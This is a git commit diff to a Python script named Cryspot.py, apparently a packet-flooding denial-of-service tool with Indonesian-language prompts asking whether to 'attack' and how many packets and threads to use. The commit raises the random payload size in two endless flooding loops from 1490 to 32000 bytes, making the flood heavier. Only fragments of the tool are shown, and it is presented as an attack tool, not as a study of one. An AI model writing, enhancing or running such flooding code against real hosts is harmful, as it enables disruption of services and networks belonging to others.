181e7da364708c254302040eb985e5f106e8921a
Cryspot <94024627+Cryspot@users.noreply.github.com>
2021-11-16 12:59:12 +0700

    Update Cryspot.py

--- Cryspot.py
+++ Cryspot.py
@@ -27,7 +27,7 @@ choice = str(input("Serang Ga Ni WOY?(y/n):"))
 times = int(input("Packetnya berapa | Packets:"))
 threads = int(input("Mau Berapa Lama | Threads:"))
 def run():
-        data = random._urandom(1490)
+        data = random._urandom(32000)
         i = random.choice(("[*]","[!]","[#]"))
         while True:
                 try:
@@ -39,7 +39,7 @@ def run():
                 except:
                         print("\033[94m[*TOK*TOK*] PERMISI PAKET DATENG ")
 def run2():
-        data = random._urandom(1490)
+        data = random._urandom(32000)
         i = random.choice(("[*]","[!]","[#]"))
         while True:
                 try:
